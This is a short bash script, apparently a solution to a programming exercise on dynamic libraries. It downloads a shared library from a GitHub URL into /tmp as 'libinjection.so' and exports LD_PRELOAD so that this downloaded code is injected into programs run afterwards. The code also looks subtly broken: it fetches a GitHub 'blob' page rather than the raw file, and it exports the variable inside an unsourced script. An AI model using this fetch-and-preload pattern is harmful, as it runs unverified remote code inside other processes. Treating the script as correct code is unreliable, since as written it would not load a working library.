#!/bin/bash
wget -O /tmp/libinjection.so https://github.com/VicktrK/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libdynamic.so
export LD_PRELOAD=/tmp/libinjection.so
